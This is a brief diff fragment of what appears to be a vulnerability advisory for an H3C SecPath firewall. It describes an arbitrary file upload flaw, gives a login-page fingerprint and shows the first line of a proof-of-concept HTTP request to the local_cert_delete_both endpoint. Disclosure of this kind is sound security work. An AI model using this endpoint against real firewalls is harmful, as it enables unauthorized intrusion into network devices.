@@ -8,7 +8,7 @@ H3C SecPath 下一代防火墙 存在任意文件上传漏洞，攻击者通过�
 title="Web user login"
 ```
 
-## poc
+## POC
 
 ```yaml
 POST /webui/?g=local_cert_delete_both HTTP/1.1
